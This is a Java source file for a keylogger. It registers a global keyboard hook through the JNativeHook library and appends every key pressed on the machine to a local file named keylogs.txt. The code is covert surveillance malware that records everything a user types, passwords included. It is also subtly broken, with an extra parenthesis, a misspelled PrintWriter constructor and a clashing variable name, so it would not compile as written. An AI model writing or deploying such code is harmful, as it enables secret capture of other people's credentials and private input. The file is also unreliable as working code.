package com.example.logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

/**
 * Global Keyboard Listener
 */
public class keylogger implements NativeKeyListener {

    public static final Path file = Paths.get("keylogs.txt");


    /* Key Pressed */
    public void nativeKeyPressed(NativeKeyEvent e) {
        String text = NativeKeyEvent.getKeyText(e.getKeyCode()));

        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND); PrintWriter w = newPrintWrite(os)) {
            if (text.length() > 1) {
                w.print("[" + text + "]");
            } else {
                w.print(text);
            }
        } catch (IOException e) {
            System.exit(1);
        }
    }

    /* Key Released */
    public void nativeKeyReleased(NativeKeyEvent e) {
    }

    /* Key Typed */
    public void nativeKeyTyped(NativeKeyEvent e) {
    }

    public static void main(String[] args) {
        try {
            /* Register jNativeHook */
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            /* Its error */
            System.err.println("There was a problem registering the native hook.");
            System.err.println(e.getMessage());
            System.exit(1);
        }

        /* Construct the example object and initialze native hook. */
        GlobalScreen.addNativeKeyListener(new keylogger());
    }
}
